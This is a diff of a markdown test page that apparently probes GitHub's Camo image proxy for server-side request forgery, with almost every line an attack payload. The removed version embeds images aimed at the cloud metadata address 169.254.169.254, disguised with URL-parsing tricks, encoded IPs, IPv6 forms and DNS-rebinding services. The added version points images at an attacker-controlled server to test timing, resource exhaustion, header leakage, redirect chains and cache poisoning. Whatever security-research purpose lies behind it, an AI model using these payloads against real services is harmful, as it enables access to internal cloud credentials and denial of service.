@@ -1,106 +1,56 @@
-# v51: Advanced URL Parsing & Bypass Techniques
+# v52: Advanced Vulnerability Testing
 
-> Testing URL parsing edge cases that might bypass Camo's URL validation
-
----
-
-## 1. URL Parsing Confusion (@ symbol - credentials in URL)
-
-### @ before hostname (credentials parsing)
-![at1](http://webhook.site@169.254.169.254/latest/meta-data/)
-
-### Double @ 
-![at2](http://foo@bar@169.254.169.254/)
-
-### @ with encoded chars
-![at3](http://webhook.site%40169.254.169.254/)
+> Testing timing attacks, large payloads, slow responses, header leakage, and more.
+> Server running on `164.90.187.218:8888` via `nip.io`.
 
 ---
 
-## 2. Backslash vs Forward Slash Confusion
+## 1. Timing Attacks (Time-based SSRF)
 
-### Backslash in path
-![bs1](http://169.254.169.254\latest\meta-data\)
+### 2 second delay
+![time2](http://164.90.187.218.nip.io:8888/timing?delay=2)
 
-### Mixed slashes
-![bs2](http://webhook.site\/169.254.169.254)
-
----
-
-## 3. URL Fragment Tricks
-
-### Fragment before host (browser vs server parsing)
-![frag1](http://foo#@169.254.169.254/)
-
-### Double fragment
-![frag2](http://169.254.169.254/#foo#bar)
+### 5 second delay
+![time5](http://164.90.187.218.nip.io:8888/timing?delay=5)
 
 ---
 
-## 4. Unicode/IDN Domain Tricks
+## 2. Resource Exhaustion / DoS
 
-### IDN homograph - аws (Cyrillic 'а')
-![idn1](http://аws.amazon.com/test.gif)
+### Large File (10MB)
+![large](http://164.90.187.218.nip.io:8888/large)
 
-### Mixed script domain
-![idn2](http://169。254。169。254/test)
-
----
-
-## 5. Port Tricks
-
-### Port 80 explicit
-![port1](http://169.254.169.254:80/latest/meta-data/)
-
-### Port 0
-![port2](http://169.254.169.254:0/latest/)
-
-### Port 65535
-![port3](http://169.254.169.254:65535/)
+### Slow Response (Hanging connection)
+![slow](http://164.90.187.218.nip.io:8888/slow)
 
 ---
 
-## 6. Decimal/Octal/Hex IP Encoding
+## 3. Information Leakage
 
-### Decimal IP (already tested but retry)
-![dec1](http://2852039166/latest/meta-data/)
-
-### Octal with leading zeros
-![oct1](http://0251.0376.0251.0376/)
-
-### Mixed encoding
-![mix1](http://169.0xfe.169.0xfe/)
+### Request Headers Leakage
+![headers](http://164.90.187.218.nip.io:8888/headers)
 
 ---
 
-## 7. IPv6 Tricks
+## 4. Redirect Chains
 
-### IPv6 localhost
-![ipv6-1](http://[::1]/)
-
-### IPv6 mapped IPv4 - link-local
-![ipv6-2](http://[::ffff:169.254.169.254]/)
-
-### IPv6 short form
-![ipv6-3](http://[0:0:0:0:0:ffff:a9fe:a9fe]/)
+### Multi-step Redirect (Self-referential loop/chain)
+![redir-chain](http://164.90.187.218.nip.io:8888/redirect-chain)
 
 ---
 
-## 8. DNS Rebinding Service
+## 5. Internal Service Simulation
 
-### rbndr.us rebind service
-![rebind1](http://7f000001.c0a80001.rbndr.us/)
-
-### 1u.ms rebind
-![rebind2](http://make-169.254.169.254-rr.1u.ms/)
+### Fake AWS Metadata
+![aws-fake](http://164.90.187.218.nip.io:8888/aws-fake)
 
 ---
 
-## 9. Control Test
+## 6. Cache Poisoning
 
-### Direct webhook
-![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v51-control.gif)
+### Cache Control Test (Long max-age)
+![cache](http://164.90.187.218.nip.io:8888/cache-poison)
 
 ---
 
-**v51** - Advanced URL parsing bypass attempts
+**v52** - Advanced Testing Suite
